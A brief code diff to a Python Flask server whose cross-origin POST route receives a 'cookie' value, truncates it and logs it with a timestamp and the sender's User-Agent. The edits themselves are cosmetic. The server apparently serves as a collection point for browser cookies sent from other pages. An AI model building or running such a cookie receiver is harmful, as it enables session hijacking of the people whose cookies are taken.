@@ -12,7 +12,7 @@ CORS(app)
 @app.route("/", methods=["POST"])
 def home():
     data = request.get_json()
-    # os.system("cls" if os.name == "nt" else "clear")
+    os.system("cls" if os.name == "nt" else "clear")
     print(
         colored("[🕒] ", "green")
         + colored(datetime.now().strftime("%H:%M:%S"), "cyan")
@@ -26,7 +26,7 @@ def home():
 
     cookie = data["cookie"]
 
-    if len(cookie) >60:
+    if len(cookie) > 60:
         cookie = cookie[:60] + "..."
 
     user_agent = request.headers.get("User-Agent")
